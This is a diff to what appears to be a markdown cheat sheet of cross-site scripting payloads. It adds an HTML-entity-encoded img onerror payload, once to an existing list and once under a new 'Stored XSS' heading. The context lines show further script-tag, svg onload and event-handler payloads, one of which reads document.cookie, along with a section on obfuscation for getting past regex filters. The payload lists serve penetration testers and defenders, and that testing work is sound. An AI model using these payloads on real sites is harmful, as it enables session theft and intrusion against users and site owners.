@@ -64,6 +64,7 @@ OnMoUsEoVeR=prompt(/hacked/)//
 "><script>propmt("mamunwhh")</script>
 "><script>alert(document.cookie)</script>
 /><svg src=x onload=confirm("1337");>
+&quot;&gt;&lt;img src=x onerror=confirm(document.domain);&gt;
 ```
 
 ## XSS payload with Alert Obfuscation, for bypass RegEx filters
@@ -126,3 +127,8 @@ Works in cases where double quotes are escaped
 
 can also work with single quotes (change it in the payload)
 ![img](https://pbs.twimg.com/media/Ex-cjUQXIAIRw-y?format=jpg&name=small)
+
+## Stored XSS
+```js
+&quot;&gt;&lt;img src=x onerror=confirm(document.domain);&gt;
+```
